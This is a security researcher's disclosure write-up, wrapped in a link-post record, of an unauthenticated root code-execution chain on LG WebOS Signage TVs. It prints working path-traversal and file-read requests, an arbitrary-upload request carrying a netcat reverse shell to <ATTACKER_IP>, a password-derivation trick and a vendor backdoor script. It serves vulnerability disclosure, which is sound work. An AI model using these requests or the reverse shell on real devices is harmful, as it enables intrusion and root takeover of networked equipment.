{"aid": "39989204", "title": "LG WebOS 'Pwnage' \u2013 getting unauthenticated code execution on LG Signage TVs", "url": "https://www.brzozowski.io/web-applications/2024/04/09/lg-webos-pwnage-getting-rce-on-signage-tvs.html", "domain": "brzozowski.io", "votes": 3, "user": "redfr0g", "posted_at": "2024-04-10 10:46:09", "comments": 0, "source_title": "LG WebOS \u2018Pwnage\u2019 \u2013 getting unauthenticated code execution on enterprise Signage TVs", "source_text": "LG WebOS \u2018Pwnage\u2019 \u2013 getting unauthenticated code execution on enterprise\nSignage TVs - Cybersecurity and research blog\n\n# Jakub Brzozowski\n\nPentester, bug bounty hunter and security researcher. Also huge fan of Star\nWars and coffee connaisseur\n\nNavigation\n\n  * Home\n  * Whoami\n  * Contact\n  * Certificates\n\n# LG WebOS \u2018Pwnage\u2019 \u2013 getting unauthenticated code execution on enterprise\nSignage TVs\n\n09 Apr 2024 \u00bb web-applications\n\n## tl;dr\n\nThis post is a summary of our security research work that started a year ago.\nTogether with Franek, we\u2019ve targeted LG enterprise TV operating system \u2013 WebOS\nSignage. As a result of our work, we\u2019ve discovered multiple vulnerabilities\nwhere only two of them were published by LG. Those vulnerabilities resulted in\na chained exploit that allowed remote attacker on the same network to execute\ncode on vulnerable TV as root user (if the default configuration is used).\n\n## Backstory\n\nLast year, my colleague Franek and I completed an interesting pentesting\nassignment where we tested some enterprise conferencing hardware equipment.\nOne of the devices we tested was an LG TV with a \u2018Signage\u2019 operating system.\nThis version of the operating system was based on the standard WebOS software\nfound on consumer-grade LG TVs, but with additional features such as remote\ncontrol via a centralized app, automation, and a web panel for administrative\ntasks. The assignment ended and though we did not find any severe\nvulnerabilities in the TV itself, we\u2019ve saw some research potential in it.\n\nWe decided to buy one of the models running WebOS Signage operating system and\nput it on our workbench. However, we discovered that obtaining such hardware\nis not straightforward. To order the TV, you must make an \u2018inquiry\u2019 on the\nofficial website, become an LG partner, or purchase the TV from one of the\ntechnical partners.\n\nPurchase website of LG Signage TV.\n\nAs we were not eager to start up our own company, we\u2019ve decided to obtain the\nTV from less formal channels...\n\nSuccessful purchase of LG Signage TV.\n\n## First look\n\nWe have ended up buying LG SM5JUL3J model, which is a 32-inch screen that is\nrunning WebOS Signage version 6.0, allows centralized remote control, usage of\nexternal sensors and uses a FHD display. More specs about this model can be\nfound here.\n\nThe unit was running a slightly outdated firmware - 03.05.90. We decided that\nwe needed to get the firmware with either equal or newer version, so that we\ncould first look in the device\u2019s file system. We could do this in two ways -\nextract it from the device itself or obtain the firmware from the public\nInternet. We chose the second option, and a few quick n\u2019 dirty google dorks\nlater we found a website that allowed us to download the WebOS Signage\nfirmware for at least some versions back - jackpot!\n\nFirmware download page for LG WebOS Signage.\n\nDownloaded firmware is in EPK format which is a proprietary LG Firmware\nPackage file format. Luckily some development by the community was already\ndone to decrypting and unpacking these firmware packages. We have used the\nepk2extract tool to unpack the firmware and get our hands on the filesystem.\n\nExtraction of the filesystem from EPK file.\n\nSuccessfully extracted filesystem.\n\nWe wanted to confirm that the file system we\u2019d extracted matched the files on\nour device. To discover any running services, we ran a full Nmap scan of the\nexposed TCP ports. The result showed that many services were enabled and\naccessible:\n\n    \n    \n    PORT STATE SERVICE REASON 443/tcp open https syn-ack 515/tcp open printer syn-ack 1252/tcp open bspne-pcc syn-ack 1268/tcp open propel-msgsys syn-ack 1391/tcp open iclpv-sas syn-ack 1485/tcp open lansource syn-ack 1619/tcp open xs-openstorage syn-ack 2046/tcp open sdfunc syn-ack 3000/tcp open ppp syn-ack 3001/tcp open nessus syn-ack 3737/tcp open xpanel syn-ack 8152/tcp open unknown syn-ack 9080/tcp open glrpc syn-ack 9761/tcp open unknown syn-ack 9869/tcp open unknown syn-ack 18181/tcp open opsec-cvp syn-ack 36866/tcp open unknown syn-ack 49152/tcp open unknown syn-ack\n\nOn port 443 (in newer versions port 3777), we could see that the main \u201cContent\nManager\u201d web application was running.\n\nThe purpose of the app was to automate and control all the things that had to\ndo with displaying any content on the screen \u2013 displaying canteen menu,\nadvertisements, or information.\n\nOn port 3737 we could see another web application - Control Manager. This\nsoftware is mainly used for administrative tasks and to connect the TV to a\ncentralized system where each device can be controlled from a command center.\n\nAs both apps were looking promising, and as a team we were more proficient in\nfinding vulnerabilities in web applications, we have decided to first take a\nlook at them.\n\n## One does not simply do a path traversal\n\nAfter some time spent playing around with the web application functionalities,\nFranek discovered some odd behavior with one of the endpoints in the Content\nManager. More specifically, the /appId API was looking to be vulnerable to\npath traversal:\n\nRequest:\n\n    \n    \n    GET /appId/../../../../../../etc/passwd HTTP/1.1 Host: <IP> Cookie: <COOKIES> Connection: close\n\nResponse:\n\n    \n    \n    HTTP/1.1 200 OK [...] Content-Type: application/octet-stream Content-Length: 913 Connection: close root:x:0:0:root:/home/root:/bin/sh daemon:x:1:1:daemon:/usr/sbin:/bin/false bin:x:2:2:bin:/bin:/bin/false sys:x:3:3:sys:/dev:/bin/false sync:x:4:100:sync:/bin:/bin/sync mail:x:8:8:mail:/var/spool/mail:/bin/false proxy:x:13:13:proxy:/bin:/bin/false www:x:33:33:www:/pub/www:/bin/false backup:x:34:34:backup:/var/backups:/bin/false operator:x:37:37:Operator:/var:/bin/false haldaemon:x:68:68:hald:/:/bin/false dbus:x:81:81:dbus:/var/run/dbus:/bin/false nobody:x:99:99:nobody:/home:/bin/false avahi:x:101:101::/run/avahi-daemon:/bin/false messagebus:x:102:102::/var/lib/dbus:/bin/false sshd:x:103:99:Operator:/var:/bin/false developer:x:504:504:developer:/home/developer:/bin/sh wam:x:505:505::/media/wam:/bin/false pulse:x:507:507::/var/run/pulse:/bin/false db8:x:510:510::/var/db:/bin/false kadaptor:x:511:511::/usr/bin:/bin/false ums:x:512:512::/var/lib/ums:/bin/false systemd-bus-proxy:x:999:997::/:/bin/nologin\n\nThis looked like a promising start! We\u2019ve quickly updated the device to the\nlatest firmware version and send the request again eager to confirm the\nvulnerability. Sadly, the device sent us the following response:\n\nRequest on a new version:\n\n    \n    \n    GET /appId/../../../../../../etc/passwd HTTP/1.1 Host: <IP> Cookie: <COOKIES>\n\nResponse:\n\n    \n    \n    HTTP/1.1 302 Found [...] Location: /main Content-Type: text/plain; charset=utf-8 Content-Length: 27 Connection: close Found. Redirecting to /main\n\nThis was a bummer, but we decided not to give up on the Content Manager app.\nThis decision turned out to be right one, as Franek sometime later found\nanother vulnerability that allowed us to read files from the device. The\n/thumbnail/file API was not doing any sanitization to the passed reqParam\nparameter and was simply reading file contents for us:\n\nRequest to thumbnail API:\n\n    \n    \n    GET /thumbnail/file?reqParam={\"path\":\"/etc/shadow\",\"time\":123123123} HTTP/1.1 Host: <IP> Cookie: <COOKIES> Connection: close\n\nResponse:\n\n    \n    \n    HTTP/1.1 200 OK [...] Content-Type: application/octet-stream Content-Length: 913 root:*:19263:0:99999:7::: daemon:x:19263:0:99999:7::: bin:x:19263:0:99999:7::: sys:x:19263:0:99999:7::: sync:x:19263:0:99999:7::: mail:x:19263:0:99999:7::: proxy:x:19263:0:99999:7::: www:x:19263:0:99999:7::: backup:x:19263:0:99999:7::: operator:x:19263:0:99999:7::: haldaemon:x:19263:0:99999:7::: dbus:x:19263:0:99999:7::: nobody:x:19263:0:99999:7::: avahi:!:19263:0:99999:7::: messagebus:!:19263:0:99999:7::: sshd:x:19263:0:99999:7::: developer:x:19263:0:99999:7::: wam:x:19263:0:99999:7::: pulse:x:19263:0:99999:7::: db8:x:19263:0:99999:7::: kadaptor:x:19263:0:99999:7::: ums:x:19263:0:99999:7::: systemd-bus-proxy:!:19263:0:99999:7:::\n\nThe function responsible for this vulnerability was getThumbFile() in\n/usr/palm/services/com.webos.service.commercial.webgateway/src/embeddedcms/service/thumbnailService.js\nfile:\n\n    \n    \n    const getThumbFile = function (req, res) { let reqParam = req.body.reqParam ? req.body.reqParam : req.query.reqParam; (0, _WebUtil.requiredParamThrowError)(reqParam, \"reqParam is required\"); reqParam = JSON.parse(reqParam); (0, _WebUtil.requiredParamThrowError)(reqParam.path, \"path is required\"); let stat = fs.statSync(reqParam.path); res.writeHead(200, { 'Content-Type': 'application/octet-stream', 'Content-Length': stat.size }); let readStream = fs.createReadStream(reqParam.path); // We replaced all the event handlers with a simple call to readStream.pipe() readStream.pipe(res); };\n\nGreat! Now we were able to read any file from the device as the gateway\nservice was running with root permissions.\n\n## All your files are belong to us\n\nMeanwhile, another endpoint caught my attention. The Control Manager, NodeJS\napplication running on port 3737 was using /upload API to upload image that\ncould be displayed if some malfunction with the centralized control system\nhappens. This functionality was called a \u201cFailover\u201d image upload. Upload\nfunctionality was handled by and external multer package. As we can read in\nthe NPM docs:\n\n> Multer is a node.js middleware for handling multipart/form-data, which is\n> primarily used for uploading files.\n\nIndeed, request sent to the /upload endpoint is in form of multipart/form-data\ncontent type. A sample upload request can be found below:\n\nSample request to /upload API:\n\n    \n    \n    POST /upload HTTP/1.1 Host: <IP>:3737 Cookie: <COOKIES> Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQRnOjAuLw7kux0x6 Connection: close ------WebKitFormBoundaryQRnOjAuLw7kux0x6 Content-Disposition: form-data; name=\"dir\" /mnt/lg/appstore/signage/.failover/ ------WebKitFormBoundaryQRnOjAuLw7kux0x6 Content-Disposition: form-data; name=\"newname\" test.png ------WebKitFormBoundaryQRnOjAuLw7kux0x6 Content-Disposition: form-data; name=\"failOver\"; filename=\"test.png\" Content-Type: image/png <IMAGE_DATA>\n\nThe implementation of the multer package is done in\n/usr/palm/services/com.webos.service.outdoorwebcontrol/routes/index.js file.\nCode that handled parsing upload parameters into destination path on the\ndevice is presended below:\n\n    \n    \n    var storage = multer.diskStorage(getDiskStorageInfo()); var upload = multer({ storage: storage, fileFilter : function(req, file, cb) { if (web.env.supportLedSignage) { var ret = true; if (file.fieldname == 'update') { ret = /\\.epk$/.test(file.originalname); } else if (file.fieldname == 'upload_mask') { ret = /\\.txt$/.test(file.originalname); } else { ret = false; } cb(null, ret); } cb(null, true); } }); function getDiskStorageInfo() { return { destination: function (req, file, cb) { var to = '/media/update/'; if (file.fieldname == 'media') { var root = '/media/signage/'; to = root; if (req.body.dir) { to += req.body.dir; to = path.normalize(to); if (to.search(new RegExp('^' + root)) < 0) { to = root; } } } else if (file.fieldname == 'failOver') { to = ''; if (req.body.dir) { to += req.body.dir; to = path.normalize(to); } } else if (file.fieldname == \"upload_mask\") { to = '/var/'; } cb(null, to); }, filename: function (req, file, cb) { var name = path.basename('' + file.originalname); if (req.body.newname) { name = path.basename('' + req.body.newname); } cb(null, name); } } }\n\nDestination path is held in the storage variable. This variable is a\ndiskStorage() object, created from getDiskStorageInfo() function that can be\nfound at the bottom part of the code snippet. In this function, we can see a\ntree of conditionals statements that set to variable (destination path for our\nuploaded file) depending on which parameters are set in the request. If the\nfailOver field is set in the request, the backend will set the destination\npath to the value of dir parameter from the request without any sanitization!\nWe quickly tried to upload the file to /tmp directory and read it with the\npath traversal vulnerability we\u2019ve discovered previously:\n\nUpload to /tmp directory request:\n\n    \n    \n    POST /upload HTTP/1.1 Host: IP:3737 Cookie: <COOKIES> Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycBcAJGhoAF8Tvoep Connection: close ------WebKitFormBoundarycBcAJGhoAF8Tvoep Content-Disposition: form-data; name=\"dir\" /tmp/ ------WebKitFormBoundarycBcAJGhoAF8Tvoep Content-Disposition: form-data; name=\"newname\" test.txt ------WebKitFormBoundarycBcAJGhoAF8Tvoep Content-Disposition: form-data; name=\"failOver\"; filename=\"test.png\" Content-Type: application/js pwned ------WebKitFormBoundarycBcAJGhoAF8Tvoep--\n\nRead /tmp/test.txt file request:\n\n    \n    \n    GET /thumbnail/file?reqParam={\"path\":\"/tmp/test.txt\",\"time\":123123123} HTTP/1.1 Host: 192.168.88.254 Cookie: connect.sid=<COOKIES>\n\nSuccessful file read:\n\n    \n    \n    HTTP/1.1 200 OK [...] Content-Type: application/octet-stream Content-Length: 7 Connection: close pwned\n\nHowever, our joy quickly ended as we\u2019ve realized that our newly discovered\nunrestricted upload is actually restricted to the following directories due to\nthe file system permissions:\n\n  * /dev\n  * /home/root\n  * /media\n  * /var\n  * /tmp\n\n## It\u2019s a long way to the root (if you wanna RCE)\n\nAt this point we needed to reflect on what vulnerabilities we\u2019ve discovered\nand how we can use them to get code execution on the device. We had full file\nread on the device, and we can write any files in /dev/, /home/root, /media/,\n/var/ and /tmp directories. After quick look, we\u2019ve excluded the usage of /tmp\nand /home/root directories as they held no files used by any process. I\ndecided to focus my work on the filesystem dumped from the firmware. After\nrunning a search on files that contain \u201c/var\u201d string one file caught my\nattention. The specific file was /etc/init/wtaservice.conf. It is a startup\nfile for a service that is launched after a device is rebooted. The contents\nof the wtaservice.conf file can be found below:\n\n    \n    \n    description \"WTA is a test agent service for ATS5\" start on rest-boot-done # Comment this line out to suppress logs on the console #console output script WTA_ENABLED=/var/luna/preferences/wta_enabled WTA_USB=`find /tmp/usb/ -maxdepth 3 | grep -m 1 wta_usb.sh || /bin/true` if [ -x \"$WTA_USB\" ]; then #install wta from usb exec $WTA_USB elif [ -e $WTA_ENABLED ]; then SERVICE=com.lge.service.wta if [ -e /media/developer/$SERVICE/service_ok ]; then #wta is already installed, just launch it exec /media/developer/$SERVICE/run.sh else #start remote console for autodiscover service exec /bin/bash <<EOT SERVER_INTERNAL=hewta.lge.com SERVER_EXTERNAL=wta.iptime.org PORT=9001 FIFO=/tmp/wta.fifo #you can use $WTA_ENABLED file as a bash script #and define/redefine any variables inside it #ex: PORT=9000; SERVER_EXTERNAL=123.123.123.123 source $WTA_ENABLED #wait for server is available while [ 1 ];do SERVER=\\$SERVER_INTERNAL ping \\$SERVER -c 1 && break SERVER=\\$SERVER_EXTERNAL ping \\$SERVER -c 1 && break sleep 60 done; rm \\$FIFO; mkfifo \\$FIFO #connect to server and launch console nc \\$SERVER \\$PORT <\\$FIFO 2>&1 | /bin/bash >\\$FIFO 2>&1 EOT fi fi end script\n\nAfter initial inspection you can clearly see that something odd is happening\nin this file. First the script checks WTA_ENABLED or WTA_USB conditions. If\nthe file /var/luna/preferences/wta_enabled exists (yes, we can write files to\nthe /var/ directory!), the script will do VERY strange things. On first\ncondition it will either run the run.sh script, but it won\u2019t as the developer\ndirectory was not created on out device, and we couldn\u2019t create any\ndirectories \u2013 just write or create files. The second condition is even\nstranger. First it assigns some server and port variables:\n\n    \n    \n    SERVER_INTERNAL=hewta.lge.com SERVER_EXTERNAL=wta.iptime.org PORT=9001\n\nThen a source command is run on /var/luna/preferences/wta_enabled file:\n\n    \n    \n    source $WTA_ENABLED\n\nThen an availability check is done via ping (great stuff):\n\n    \n    \n    while [ 1 ];do SERVER=\\$SERVER_INTERNAL ping \\$SERVER -c 1 && break SERVER=\\$SERVER_EXTERNAL ping \\$SERVER -c 1 && break sleep 60 done;\n\nAnd finally a netcat reverse shell is launched (?):\n\n    \n    \n    nc \\$SERVER \\$PORT <\\$FIFO 2>&1 | /bin/bash >\\$FIFO 2>&1\n\nThis was more then disturbing and we were trying not to say word \u201cbackdoor\u201d\nwhen reading above code. However this script was perfect to escalate our file\nwrite vulnerabilities to achieve remote code execution. In the above script, a\nsource command will execute any code from the wta_enabled file located in the\n/var/ directory. We\u2019ve quickly send the request to create a file with reverse\nshell and reboot the TV:\n\nReverse shell upload request:\n\n    \n    \n    POST /upload HTTP/1.1 Host: <IP>:3737 Cookie: connect.sid=<COOKIES> Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysfuG9nlqBES9Dnvo Connection: close ------WebKitFormBoundarysfuG9nlqBES9Dnvo Content-Disposition: form-data; name=\"dir\" /var/luna/preferences/ ------WebKitFormBoundarysfuG9nlqBES9Dnvo Content-Disposition: form-data; name=\"newname\" wta_enabled ------WebKitFormBoundarysfuG9nlqBES9Dnvo Content-Disposition: form-data; name=\"failOver\"; filename=\"test.png\" Content-Type: application/octet-stream rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|/usr/bin/nc <ATTACKER_IP> 1337 >/tmp/f ------WebKitFormBoundarysfuG9nlqBES9Dnvo--\n\nThen after rebooting the TV, we could happily see a connection to our netcat\nlistener (and with root privileges!):\n\n## Putting it all together\n\nSo, we got code execution on the device, but this still can be done only with\nthe administrative rights. This lowered the impact of this bug, but Franek\nfound an interesting authentication bypass if the device is not yet\nconfigured. The default administrator password for Content Manager and Control\nManager apps is created by appending the string \u201cLGe12#\u201d, to the serial number\nof the device. Luckily, the following API endpoint:\n\n    \n    \n    /system/lge/setting?reqParam={\"category\":\"network\",\"keys\":[\"deviceName\"]}\n\nCan be accessed without any authentication. In response the API will return\ndevice name in the form of JSON object:\n\n    \n    \n    \"settings\":{\"deviceName\":\"XXXXXXXXXXXX XXXX\"}\n\nThe device name is by default created with the use of a serial number. From\nthis data we can create a temporary admin password and log in as administrator\nto previously not configured device. Now we had all the pieces for the exploit\nchain:\n\n  1. Get device serial number from unauthenticated /setting endpoint,\n  2. Generate temporary password and log in to Control Manager app,\n  3. Overwrite the wta_enabled file, with reverse shell,\n  4. Reboot the device remotely using Websockets,\n  5. Listen for the shell.\n\nWe\u2019ve quickly put together a dirty PoC python script that automates all the\nexploitation. You can see a successful exploitation of a freshly reset LG\nSignage TV in the below video:\n\nAs there is still some possible attack surface for the Signage TVs exposed on\nthe web, we\u2019ve decided to not yet publish full PoC script. Below you can see\nthat based on a recent Shodan query there are 443 devices exposed to the\npublic internet:\n\n## Final words\n\nWe\u2019ve encountered some ups and downs when reporting these vulnerabilities to\nthe LGE Security team. At first, they had some problems decrypting our report\nwith their PGP key, then it took months to replicate and patch the issues.\nFinally, they required a lot of personal details from us to pay the bounty\n(i.e. bank account statements). As we did not want to provide such details, we\ndeclined the bounty and told LG to donate the bounty amount to charity.\nUnfortunately, their response was also negative to such request:\n\nWhen it comes to the weird wtaservice.conf script, it seems that we were not\nthe only ones that figured out that there is something odd with this piece of\ncode. On 23rd of December 2023, user @zibri tweeted that he found a 0-day in\nLG Smart TVs and the vendor did not want to pay for it.\n\nTwo months later, a Github Gist appeared with a detailed description of how to\nexploit the USB version of the \u201cbackdoor\u201d and also with some investigation\nabout the WTA service itself. The Gist mentions that the vulnerability was\nfound by @mariotaku but I could not find any more sources referencing this\nuser and the vulnerability.\n\nWe are not claiming that we were the first researchers to discover the\nsuspicious WTA service and exploit it. However, there is a good probability of\nthat, as LGE Security officially assigned us to their advisory.\n\nSecurity research and vulnerability reporting must be always taken with a\ngrain of salt. Some vendors will do the best to secure their products, and\nothers well... I think I do not need to add anything else if You\u2019ve read the\nabove post \u0304\\\\(\u30c4)/ \u0304\n\n## Advisory\n\nYou can find the advisory for all the vulnerabilities we\u2019ve reported here\nunder SMR-FEB-2024 section.\n\n## CVEs\n\n  * CVE-2024-1885 (LVE-2023-0118) - Remote Code Execution attack in webOS v6.0.0-56 of Signage\n  * CVE-2024-1886 (LVE-2023-0119) - Absolute path traversal attack in webOS v6.0.0-56 of Signage\n\n## Timeline\n\n  * 13/09/2023 \u2013 vulnerabilities reported to LGE Security,\n  * 30/10/2023 \u2013 vulnerabilities confirmed, and two issues resolved by LGE,\n  * 21/11/2023 \u2013 RCE issue is resolved by the LGE,\n  * 8/12/2023 \u2013 bounty payment to charity rejected by LGE,\n  * 26/02/2024 -advisory is published by LGE\n\nShare this on \u2192 Tweet\n\n#### Related Posts\n\n  * Cisco Smart Software Manager on-prem SQL Injection (Categories: web-applications)\n  * Yeswehack's Dojo #17 XSS challenge writeup (Categories: web-applications)\n  * Intigriti's April XSS challenge writeup (Categories: web-applications)\n  * Hacking into NAS (Categories: web-applications)\n  * The (in)secure story of OctoPrint (Categories: web-applications)\n  * Actually useful XSS trick (Categories: web-applications)\n\n\u00a9 Jakub Brzozowski 2024 - Powered by Jekyll. Theme made with by @agusmakmun,\nmodified by @redfr0g.\n\n", "frontpage": false}
